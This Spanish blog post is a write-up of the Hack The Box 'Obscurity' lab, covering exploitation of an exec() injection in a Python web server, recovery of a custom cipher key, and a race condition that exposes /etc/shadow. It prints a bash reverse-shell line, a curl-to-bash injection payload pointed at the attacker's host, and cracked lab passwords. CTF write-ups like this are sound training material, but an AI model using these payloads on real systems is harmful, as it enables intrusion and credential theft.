---
title: HTB ObscurityWrite-up (Español)
tags: [HackTheBox, python]
image: /assets/images/Obscurity/1__TOuZeFGPrRiKzyAxXMXnzQ.jpeg
published: true
banner: true
---

I cloned my writeup that was originally posted on [medium](https://medium.com/@5ubterranean/htb-obscuritywrite-up-espa%C3%B1ol-6d703ae8a184)

Obscurity es una máquina basada en Linux que estuvo activa desde el 30 de Noviembre del 2019 hasta el 9 de Mayo del 2019, tal como su nombre lo indica es una maquina donde se trata de la seguridad basada en la oscuridad, en este caso tendremos que leer múltiples programas escritos en python, para acceder a la máquina conseguiremos el código fuente de su página web mediante fuzzing, detectaremos una vulnerabilidad que nos permitirá ejecutar código mientras leemos el código fuente, luego tendremos que modificar un programa de encriptación personal de la máquina para recuperar la clave que utiliza, y usaremos esa clave para desencriptar la contraseña del siguiente usuario, una vez dentro de este usuario veremos que podemos ejecutar otro archivo creado por ellos el cual copia el archivo “shadow” a una carpeta públicamente accesible por un corto periodo de tiempo, por lo que leeremos el contenido del archivo en el tiempo que tenemos, recuperaremos el hash de la contraseña del usuario “root”, la crackearemos y con ella cambiaremos nuestro usuario a “root”.

# Enumeración

Empezamos usando masscan para encontrar todos los puertos disponibles y luego usamos nmap para conseguir más información de los mismos.

```bash
masscan -e tun0 — rate=500 -p 0–65535 10.10.10.168  
nmap -sC -sV -p 22,8080 -o scan.txt 10.10.10.168  
PORT     STATE SERVICE    VERSION  
22/tcp   open  ssh        OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)  
8080/tcp open  http-proxy BadHTTPServer
```

Solo tenemos dos puertos abiertos, ssh y el 8080 que a pesar de lo que dice nmap, es una página web, accedemos a ella y esta nos comprueba de que la máquina se tratará de la seguridad basada en la oscuridad.

![](/assets/images/Obscurity/1__g2yX__58lfwhc9rEBohr__Fw.png)


Y en la página se nota que el administrador está bastante orgulloso de este enfoque en la seguridad, por lo que incluso nos revela el nombre del archivo de código fuente de la página, SuperSecureServer.py, y nos indica que está en un directorio “secreto”.

![](/assets/images/Obscurity/1__BxlPUwBybh3s1yqlhoYUjw.png)


Entonces utilizamos wfuzz para encontrar el archivo.  
`wfuzz -u http://10.10.10.168:8080/FUZZ/SuperSecureServer.py -w /usr/share/wordlists/dirb/common.txt --hc 404`

![](/assets/images/Obscurity/1__Q3YYMAEHutQ__AgfMWGu6Jw.png)


Encontramos el archivo en “http://10.10.10.168:8080/develop/SuperSecureServer.py”, por lo que lo descargamos y procedemos a analizarlo. Luego de leerlo por un rato los comentarios del desarrollador nos llaman la atención y nos indican la vulnerabilidad.

![](/assets/images/Obscurity/1__Gk8KPENMvV7HqF1lGl7MpQ.png)


La vulnerabilidad se encuentra en que la ruta a la que accedamos será enviada a una función “exec”, es decir si insertamos código de python este será ejecutado.

# Ganando acceso

Creamos un archivo llamado “shell.sh” que contendrá nuestro código para una shell reversa, este código es: `bash -i >& /dev/tcp/10.10.15.64/5555 0>&1  
`Luego iniciamos un servidor http del cual la máquina atacada descargará el archivo, para esto usamos `python3 -m http.server`. Antes de ejecutar el ataque iniciamos nuestro listener con `nc -lvp 5555`, para que la máquina atacada descargue nuestra payload y la ejecute accederemos a la ruta `’;os.system(‘curl 10.10.15.64:8000/shell.sh | bash’);’`, ya que el script ya importa el módulo “os” podemos usarlo para ejecutar comandos directamente, así que podemos usar curl y enviar su salida a bash, para evitar que alguno de los carácteres especiales rompa la petición lo codificamos en URL: `%27%3b%6f%73%2e%73%79%73%74%65%6d%28%27%63%75%72%6c%20%31%30%2e%31%30%2e%31%35%2e%36%34%3a%38%30%30%30%2f%73%68%65%6c%6c%2e%73%68%20%7c%20%62%61%73%68%27%29%3b%27`.

![](/assets/images/Obscurity/1__wjQ__kmxTqxCP8mHk15yudQ.png)


Y tras enviar la petición conseguimos nuestra shell inicial.

![](/assets/images/Obscurity/1____EUx2RquDekwAjWGgYoytg.png)


# Movimiento lateral

Exploramos la máquina y vemos que cualquiera puede acceder al directorio de robert, y ahí encontramos algunos archivos interesantes.

![](/assets/images/Obscurity/1__HDejo4zgOM3gBSJ2IpUh3A.png)


Leemos el contenido de “check.txt”:  
`Encrypting this file with your key should result in out.txt, make sure your key is correct!`.  
Este nos indica que si encriptamos ese archivo usando la clave indicada el resultado será “out.txt”, no tenemos la clave, pero tenemos el archivo de entrada, el de salida y el código de encriptación y desencriptación, por lo que podemos modificarlo para recuperar la clave.  
Empezamos revisando el código de encriptación dentro de “SuperSecureCrypt.py”

```python
def encrypt(text, key):

    keylen = len(key)

    keyPos = 0

    encrypted = ""

    for x in text:

        keyChr = key\[keyPos\]

        newChr = ord(x)

        newChr = chr((newChr + ord(keyChr)) % 255)

        encrypted += newChr

        keyPos += 1

        keyPos = keyPos % keylen

    return encrypted
```

Lo que hace el script es sacar el `ord` del primer carácter de la clave y del texto, sumarlos, sacarles el módulo de 255 para asegurarse que no supere este valor y obtener el `chr` de esta operación, repite esto para cada carácter del texto de entrada y para la llave, volviendo a usarla desde el comienzo si se supera su longitud.  
Recuperar la clave es bastante sencillo, tomaremos los dos archivos que tenemos “check.txt” y “out.txt” sacaremos el `ord` de cada uno de sus valores y calcularemos la resta de “out.txt” menos “check.txt”, en caso este valor sea inferior a 0 sumaremos 255, calcularemos el `chr` de este nuevo valor y conseguimos la clave repetida múltiples veces, en el código mostrado a continuación se limitó la salida a 13 caracteres ya que luego de su primera ejecución ya conocíamos la longitud de la clave.

```python
with open("check.txt",'r') as q:

    input = q.read()

with open("out.txt",'r') as q:

    output = q.read()

key = ""

x = 0

while x < 13:

    z = ord(output\[x\]) - ord(input\[x\])

    if z < 0:

        z += 255

    key += chr(z)

    x += 1

print (key)
```

En este caso llamamos a este archivo “rev.py” y tras ejecutarlo conseguimos la clave “alexandrovich”.

![](/assets/images/Obscurity/1__AZytQhiVHHVztcq59gQxiA.png)


Ahora que recuperamos la clave podemos desencriptar el otro archivo que nos llamó la atención “passwordreminder.txt”, aquí no tenemos que realizar ningún cambio al script, solo tenemos que ejecutar `python3 SuperSecureCrypt.py -i passwordreminder.txt -k alexandrovich -d -o password.txt`, y tendremos que la contraseña de “robert” es “SecThruObsFTW”.

![](/assets/images/Obscurity/1__2EQi4BPQriL9CrUzWnlldQ.png)


Y con esto nos podemos conectar a través de ssh y conseguimos el “user.txt”.

![](/assets/images/Obscurity/1__fNBBrC7l3xM9u7dAHNRfDw.png)


# Escalación de privilegios

Ejecutamos `sudo -l` para ver si podemos ejecutar algún comando con privilegios de root y vemos que podemos ejecutar otro script propio, BetterSSH.py.

![](/assets/images/Obscurity/1__a4nmeGpTw2cuPo2DtDZeIw.png)


Tenemos permisos de lectura sobre este archivo, así que una vez más tendremos que analizar el código.  
Lo que hace este script es spawnear un estilo de shell con los privilegios del usuario del cual proveas las credenciales, para verificar esto el script recurre al archivo “shadow” y si el hash de la contraseña ingresada es el mismo que el que se encuentra allí se accede a esta shell, lo que más nos interesa del archivo se encuntra entre las líneas 15 y 26:

```python
with open('/etc/shadow', 'r') as f:

    data = f.readlines()

data = \[(p.split(":") if "$" in p else None) for p in data\]

passwords = \[\]

for x in data:

    if not x == None:

        passwords.append(x)

passwordFile = '\\n'.join(\['\\n'.join(p) for p in passwords\])

with open('/tmp/SSH/'+path, 'w') as f:

    f.write(passwordFile)

time.sleep(.1)
```

Lo que hace esta parte del código es copiar el archivo shadow a un archivo con nombre aleatorio dentro de “/tmp/SSH”, y esperar 0.1 segundos, luego el código no mostrado procederá con la evaluación de la credenciales y borrará este archivo. Para poder abusar de esta funcionalidad necesitaremos una segunda shell, ya que podemos acceder por ssh no tenemos problema con ello, luego vamos al directorio “/tmp/SSH” y ejecutamos la siguiente línea de comandos: `while true;do cat * 2>/dev/null; done`, lo que hace esta línea de comandos es imprimir el contenido de cualquier archivo dentro de este directorio, ya que este está vacio no nos inundará la pantalla y solo nos mostrará el contenido del archivo shadow, luego en nuestra primera shell ejecutamos `sudo /usr/bin/python3 /home/robert/BetterSSH/BetterSSH.py`, aunque no es necesario ingresamos las credenciales de robert.

![](/assets/images/Obscurity/1__PJ3Mg0kCUMvP1c1SiCaPsQ.png)


Y si revisamos nuestra otra shell veremos el contenido del archivo shadow en ella.

![](/assets/images/Obscurity/1__RP3Kh1mseS2H3uIBb30erA.png)


Ahora tenemos el hash de la contraseña del usuario root, “$6$riekpK4m$uBdaAyK0j9WfMzvcSKYVfyEHGtBfnfpiVbYbzbVmfbneEbo0wSijW1GQussvJSk8X1M56kzgGj8f7DFN1h4dy1”, la copiamos a nuestra máquina y dejamos que john haga su trabajo, `john hash --wordlist=/usr/share/wordlists/rockyou.txt`, una vez termine obtendremos que su contraseña es “mercedes”.

![](/assets/images/Obscurity/1__Rc__jUgzFXxpRy6apSpF3bA.png)


Todo lo que queda es ejecutar `su root`, ingresar la contraseña y habremos acabado con la máquina.

![](/assets/images/Obscurity/1____6__8EkNQsZkB8PKx9r6mOQ.png)


# Descargo de responsabilidad

Todos los recursos brindados en este post se hicieron puramente con fines educativos y de concientización, el autor no se hace responsable por las acciones que las personas puedan realizar con el contenido del mismo.